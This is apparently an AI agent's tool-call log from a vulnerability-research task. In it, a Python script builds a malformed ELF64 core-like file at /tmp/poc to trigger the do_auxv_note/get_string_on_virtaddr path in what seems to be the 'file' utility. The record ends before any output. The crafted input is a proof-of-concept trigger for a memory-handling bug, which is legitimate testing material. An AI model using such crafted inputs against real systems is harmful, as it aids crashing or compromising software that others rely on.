message:
Command `cd /workspace/repo-vul/src-vul/file && python3 - <<'PY'
from pathlib import Path
p=Path('/tmp/poc')
# ELF64 core-like note payload to exercise do_auxv_note/get_string_on_virtaddr path
b=bytearray(512)
b[0:4]=b'\x7fELF'
b[4]=2;b[5]=1;b[6]=1
# e_phoff=64, e_phentsize=56, e_phnum=1
b[32:40]=(64).to_bytes(8,'little')
b[54:56]=(56).to_bytes(2,'little')
b[56:58]=(1).to_bytes(2,'little')
# program header at 64
ph=64
b[ph:ph+4]=(4).to_bytes(4,'little') # PT_NOTE
b[ph+8:ph+16]=(128).to_bytes(8,'little') # p_offset
b[ph+16:ph+24]=(0x400000).to_bytes(8,'little') # vaddr
b[ph+32:ph+40]=(64).to_bytes(8,'little') # filesz
# note at 128: namesz=4 descsz=16 type=NT_GNU_VERSION, name GNU, desc auxv pair AT_LINUX_EXECFN -> virtaddr 0x400020
note=128
b[note:note+4]=(4).to_bytes(4,'little')
b[note+4:note+8]=(16).to_bytes(4,'little')
b[note+8:note+12]=(1).to_bytes(4,'little')
b[note+12:note+16]=b'GNU\x00'
# desc aligned at 144
b[144:152]=(31).to_bytes(8,'little')
b[152:160]=(0x400020).to_bytes(8,'little')
# data at file offset 0x20 within PT_NOTE mapping? actually virtaddr maps to p_offset + 0x20 = 0x80, but that's okay if within file
b[0x80:0x80+16]=b'/bin/AAAAAAAAAAA\x00'
p.write_bytes(b)
print(p)
